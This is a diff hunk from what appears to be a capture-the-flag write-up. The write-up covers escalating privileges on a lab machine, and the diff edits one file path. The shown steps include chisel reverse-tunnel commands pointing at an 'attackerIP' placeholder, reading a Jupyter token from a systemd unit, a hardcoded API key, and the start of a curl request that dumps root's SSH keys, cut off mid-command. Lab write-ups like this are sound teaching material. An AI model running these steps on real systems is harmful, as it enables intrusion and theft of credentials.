@@ -8,7 +8,7 @@ Server - ./chisel server --reverse -p 9000
 Client - ./chisel client attackerIP:9000 R:8888:127.0.0.1:8888
 6. The Jupyter instance requires a token for authentication. During enumeration, I find the token in /etc/systemd/system/multi-user.target.wants/jupyter.service.
 7. After entering the token, I can open a terminal as analyst and retrieve user.txt. 
-8. While enumerating as mcp-dev, I also discover through ps auxf | grep python that root owns a file called server.py. mcp-dev does not have permission to read it, but analyst does. After reading the file, I find the VALID_API_KEY and a hidden tool called ops._admin_dump, which can dump the root user's SSH keys through a service running on localhost:5000.
+8. While enumerating as mcp-dev, I also discover through ps auxf | grep python that root owns a file /opt/opsmcp/server.py. mcp-dev does not have permission to read it, but analyst does. After reading the file, I find the VALID_API_KEY and a hidden tool called ops._admin_dump, which can dump the root user's SSH keys through a service running on localhost:5000.
 9. I create a payload to dump the ssh_keys, 
 curl \
 -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
